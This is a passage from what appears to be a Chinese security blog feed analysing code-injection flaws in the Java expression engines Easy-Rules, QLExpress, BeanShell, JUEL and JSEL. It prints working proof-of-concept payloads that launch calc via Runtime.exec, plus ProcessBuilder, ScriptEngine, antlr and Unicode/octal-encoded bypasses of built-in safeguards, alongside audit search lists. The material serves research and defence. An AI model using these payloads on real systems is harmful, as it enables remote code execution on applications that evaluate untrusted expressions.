src="/2020/04/12/浅析Easy-Rules代码注入漏洞/4.png" alt=""></p><h3 id="SpEL模板三种形式的注入"><a href="#SpEL模板三种形式的注入" class="headerlink" title="SpEL模板三种形式的注入"></a>SpEL模板三种形式的注入</h3><p>在Easy-Rules的SpEL模板中可以使用SpEL语句来进行代码注入RCE，其中有三种不同的触发方式，注入的语句为SpEL表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.*;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.spel.SpELAction;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.spel.SpELCondition;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.spel.SpELRule;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Demo1: Action.evaluate()</span></span><br><span class="line"><span class="comment">//        Facts facts = new Facts();</span></span><br><span class="line"><span class="comment">//        Action action = new SpELAction("T(java.lang.Runtime).getRuntime().exec('calc')");</span></span><br><span class="line"><span class="comment">//        action.execute(facts);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Demo2: Rule.evaluate()</span></span><br><span class="line"><span class="comment">//        Facts facts = new Facts();</span></span><br><span class="line"><span class="comment">//        Rule rule = new SpELRule()</span></span><br><span class="line"><span class="comment">//                .name("exp")</span></span><br><span class="line"><span class="comment">//                .description("Exp Test")</span></span><br><span class="line"><span class="comment">//                .priority(1)</span></span><br><span class="line"><span class="comment">//                .when("T(java.lang.Runtime).getRuntime().exec('calc')")</span></span><br><span class="line"><span class="comment">//                .then("#user.setName('mi1k7ea')");</span></span><br><span class="line"><span class="comment">//        rule.evaluate(facts);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Demo3: Condition.evaluate()</span></span><br><span class="line">        Facts facts = <span class="keyword">new</span> Facts();</span><br><span class="line">        Condition condition = <span class="keyword">new</span> SpELCondition(<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc')"</span>);</span><br><span class="line">        condition.evaluate(facts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/12/浅析Easy-Rules代码注入漏洞/5.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>常规的Java代码注入参考SpEL注入的通过反射和字符串拼接等形式的绕过即可。</p><p>Easy-Rules中SpEL模块的同SpEL注入绕过技巧即可。</p><p>Easy-Rules中MvEL模块的同MvEL注入绕过技巧即可。</p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.jeasy.rules.api.RulesEngine.fire()</span><br><span class="line">org.jeasy.rules.api.Action.execute()</span><br><span class="line">org.jeasy.rules.api.Condition.evaluate()</span><br><span class="line">org.jeasy.rules.api.Rule.evaluate()</span><br><span class="line">org.jeasy.rules.spel.SpELAction.execute()</span><br><span class="line">org.jeasy.rules.spel.SpELCondition.evaluate()</span><br><span class="line">org.jeasy.rules.spel.SpELRule.evaluate()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="QLExpress注入" scheme="https://www.mi1k7ea.com/tags/QLExpress%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析QLExpress表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90QLExpress%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析QLExpress表达式注入漏洞/</id>
    <published>2020-04-11T13:38:27.000Z</published>
    <updated>2020-04-11T17:44:35.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。</p><p>QLExpress脚本引擎被广泛应用在阿里的电商业务场景，具有以下的一些特性:</p><ul><li>线程安全，引擎运算过程中的产生的临时变量都是threadlocal类型。</li><li>高效执行，比较耗时的脚本编译过程可以缓存在本地机器，运行时的临时变量创建采用了缓冲池的技术，和groovy性能相当。</li><li>弱类型脚本语言，和groovy，javascript语法类似，虽然比强类型脚本语言要慢一些，但是使业务的灵活度大大增强。</li><li>安全控制,可以通过设置相关运行参数，预防死循环、高危系统api调用等情况。</li><li>代码精简，依赖最小，250k的jar包适合所有java的运行环境，在android系统的低端pos机也得到广泛运用。</li></ul><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>参考：<a href="https://github.com/alibaba/QLExpress" target="_blank" rel="noopener">https://github.com/alibaba/QLExpress</a></p><h2 id="0x03-安全风险控制"><a href="#0x03-安全风险控制" class="headerlink" title="0x03 安全风险控制"></a>0x03 安全风险控制</h2><p>防止调用不安全的系统API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  ExpressRunner runner = <span class="keyword">new</span> ExpressRunner();</span><br><span class="line">  QLExpressRunStrategy.setForbiddenInvokeSecurityRiskMethods(<span class="keyword">true</span>);</span><br><span class="line">  </span><br><span class="line">  DefaultContext&lt;String, Object&gt; context = <span class="keyword">new</span> DefaultContext&lt;String, Object&gt;();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">  express = <span class="string">"System.exit(1);"</span>;</span><br><span class="line">      Object r = runner.execute(express, context, <span class="keyword">null</span>, <span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">      System.out.println(r);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"没有捕获到不安全的方法"</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (QLException e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>内置不让调用Runtime.class，也可以在使用过程中用addSecurityRiskMethod函数添加黑名单。</p><h2 id="0x04-PoC"><a href="#0x04-PoC" class="headerlink" title="0x04 PoC"></a>0x04 PoC</h2><p>需要的jar包：QLExpress-3.2.4、commons-logging-1.2。</p><p>代码如下，此时是未开启安全风险控制的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ql.util.express.DefaultContext;</span><br><span class="line"><span class="keyword">import</span> com.ql.util.express.ExpressRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExpressRunner expressRunner = <span class="keyword">new</span> ExpressRunner();</span><br><span class="line">        DefaultContext&lt;String, Object&gt; context = <span class="keyword">new</span> DefaultContext&lt;String, Object&gt;();</span><br><span class="line">        String exp = <span class="string">"java.lang.Runtime.getRuntime().exec('calc')"</span>;.</span><br><span class="line">        System.out.println(expressRunner.execute(exp, context, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析QLExpress表达式注入漏洞/1.png" alt=""></p><p>添加开启安全风险控制的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ql.util.express.DefaultContext;</span><br><span class="line"><span class="keyword">import</span> com.ql.util.express.ExpressRunner;</span><br><span class="line"><span class="keyword">import</span> com.ql.util.express.config.QLExpressRunStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 开启安全风险控制</span></span><br><span class="line">        QLExpressRunStrategy.setForbiddenInvokeSecurityRiskMethods(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        ExpressRunner expressRunner = <span class="keyword">new</span> ExpressRunner();</span><br><span class="line">        DefaultContext&lt;String, Object&gt; context = <span class="keyword">new</span> DefaultContext&lt;String, Object&gt;();</span><br><span class="line">        String exp = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        System.out.println(expressRunner.execute(exp, context, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再访问就被默认过滤了：</p><p><img src="/2020/04/11/浅析QLExpress表达式注入漏洞/2.png" alt=""></p><h2 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05 绕过"></a>0x05 绕过</h2><p>主要是绕过自带的安全控制。</p><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.lang.ProcessBuilder([&apos;calc&apos;]).start()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析QLExpress表达式注入漏洞/3.png" alt=""></p><h3 id="ScriptEngine引擎"><a href="#ScriptEngine引擎" class="headerlink" title="ScriptEngine引擎"></a>ScriptEngine引擎</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.getClass().forName(&apos;javax.script.ScriptEngineManager&apos;).newInstance().getEngineByName(&apos;JavaScript&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析QLExpress表达式注入漏洞/4.png" alt=""></p><h3 id="antlr"><a href="#antlr" class="headerlink" title="antlr"></a>antlr</h3><p>注意，这里需要环境中存在antlr-3.2.0.wso2v1的jar包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t = new antlr.build.Tool();t.system(&apos;calc&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析QLExpress表达式注入漏洞/5.png" alt=""></p><h2 id="0x06-排查方法"><a href="#0x06-排查方法" class="headerlink" title="0x06 排查方法"></a>0x06 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.ql.util.express.ExpressRunner.execute()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="QLExpress注入" scheme="https://www.mi1k7ea.com/tags/QLExpress%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析BeanShell代码注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90BeanShell%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析BeanShell代码注入漏洞/</id>
    <published>2020-04-11T13:09:33.000Z</published>
    <updated>2020-04-11T13:37:26.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Beanshell (bsh) 是用Java写成的，一个小型的、免费的、可以下载的、嵌入式的Java源代码解释器，具有对象脚本语言特性。</p><p>BeanShell执行标准Java语句和表达式，另外包括一些脚本命令和语法。它将脚本化对象看作简单闭包方法（simple method closure）来支持，就如同在Perl和JavaScript中的一样。　它具有以下的一些特点：使用Java反射API以提供Java语句和表达式 的实时解释执行；可以透明地访问任何Java对象和API；可以在命令行模式、控制台模式、小程序模式和远程线程服务器模式等四种模式下面运行；与在应用 程序中一样，可以在小程序中（Applet）正常运行（无需编译器或者类装载器）；非常精简的解释器jar文件大小为175k。</p><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>BeanShell语法和Java相当：</p><ul><li>Bean的访问支持花括号或是字段名，不需要get、set方法，可用<code>object{field}</code>来调用；</li><li>System.out.println直接有print替代；</li><li>方法调用可用Java语法，如java.lang.Runtime.getRuntime()；</li></ul><p>更多的可参考BeanShell的Wiki：<a href="https://github.com/beanshell/beanshell/wiki" target="_blank" rel="noopener">https://github.com/beanshell/beanshell/wiki</a></p><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：bsh-2.0b6、bsf-2.4.0、commons-logging-1.2。</p><h3 id="bsh-Interpreter"><a href="#bsh-Interpreter" class="headerlink" title="bsh.Interpreter"></a>bsh.Interpreter</h3><p>注意：BeanShell语法和Java1的基本一样，对于字符串类型的内容必须使用双引号括起来才能识别到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bsh.Interpreter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Interpreter interpreter = <span class="keyword">new</span> Interpreter();</span><br><span class="line">        String exp = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        interpreter.eval(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析BeanShell代码注入漏洞/1.png" alt=""></p><h3 id="BSFManager"><a href="#BSFManager" class="headerlink" title="BSFManager"></a>BSFManager</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bsf.BSFManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BSFManager bsfManager = <span class="keyword">new</span> BSFManager();</span><br><span class="line">        String exp = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        Object result = bsfManager.eval(<span class="string">"beanshell"</span>, <span class="string">"no"</span>, <span class="number">0</span>, <span class="number">0</span>, exp);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析BeanShell代码注入漏洞/2.png" alt=""></p><h3 id="ScriptEngineManager的BSH扩展"><a href="#ScriptEngineManager的BSH扩展" class="headerlink" title="ScriptEngineManager的BSH扩展"></a>ScriptEngineManager的BSH扩展</h3><p>在ScriptEngineManager中存在BeanShell的引擎扩展，利用该扩展同样能执行（注意，还是需要bsh的jar包的）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine scriptEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"bsh"</span>);</span><br><span class="line">        String exp = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">        scriptEngine.eval(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析BeanShell代码注入漏洞/3.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>绕过技巧同SpEL注入中的反射利用技巧，这里不再赘述。</p><p>此外，支持Unicode编码和八进制编码。</p><p>Unicode编码，注意标识字符串的双引号不能进行Unicode编码，否则识别不出是个字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028&quot;\u0063\u0061\u006c\u0063&quot;\u0029</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析BeanShell代码注入漏洞/4.png" alt=""></p><p>八进制编码，没有上面的限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(\42c\141lc&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析BeanShell代码注入漏洞/5.png" alt=""></p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bsh.Interpreter.eval()</span><br><span class="line">org.apache.bsf.BSFManager.eval()</span><br><span class="line">javax.script.ScriptEngine.eval()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="BeanShell注入" scheme="https://www.mi1k7ea.com/tags/BeanShell%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析JUEL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90JUEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析JUEL表达式注入漏洞/</id>
    <published>2020-04-11T12:44:52.000Z</published>
    <updated>2020-04-11T13:08:08.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Juel（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p><p>具体可看Juel官网的文档。</p><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>JUEL和EL语法类似，可参考官网：<a href="http://juel.sourceforge.net/" target="_blank" rel="noopener">http://juel.sourceforge.net/</a></p><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExpressionFactory expressionFactory = <span class="keyword">new</span> ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = <span class="keyword">new</span> SimpleContext();</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;";</span></span><br><span class="line">        <span class="comment">// 利用ScriptEngine引擎绕过执行</span></span><br><span class="line">        String exp = <span class="string">"$&#123;''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")&#125;"</span>;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析JUEL表达式注入漏洞/1.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>前面Demo中利用了ScriptEngine引擎绕过执行，其他绕过技巧同SpEL注入中的反射利用技巧，这里不再赘述。</p><p>此外，字符串支持八进制编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;c\141lc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析JUEL表达式注入漏洞/2.png" alt=""></p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="JUEL注入" scheme="https://www.mi1k7ea.com/tags/JUEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析JSEL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90JSEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析JSEL表达式注入漏洞/</id>
    <published>2020-04-11T12:25:43.000Z</published>
    <updated>2020-04-11T12:42:47.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>JSEL是一个基于逆波兰式结构，采用JS运算规则的简单的表达式解释引擎。 同时它还是一个JSON解析引擎。</p><p>基本特征编辑</p><ul><li>基于逆波兰式这个简单的计算模型，最大的特点就是简单。</li><li>支持短路优化（运算过程中，会根据需要，跳过无需计算的节点（boolean运算和三元运算有此类需求）。</li><li>运算规则基于前端开发人员熟悉的JavaScript，可以用于模板引擎的表达式实现。</li><li>他同时还是JSON解释引擎的超集，可以用于解释JSON数据源。</li><li>简单的运算接口，可以简单的重新定义运算规则。</li><li>由于引擎本身实现的简单，程序体积非常小（JAR文件只有22k，同类工具OGNL 168k）；适合于嵌入其他对文件大小要求苛刻环境，如需要下载的webstart小程序。</li></ul><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>具体参考：<a href="https://blog.csdn.net/yuanfang_me/article/details/78253965https://blog.csdn.net/yuanfang_me/article/details/78253965" target="_blank" rel="noopener">JSEL</a></p><ul><li>运算规则基于JavaScript；</li><li>支持变量、常量（基础类型/数字/对象字面量）、ECMA全局函数/对象、基本运算符；</li><li>方法调用：’123’.startsWith(‘12’)；</li></ul><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：jsel-0.1.0、commons-logging-1.2。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 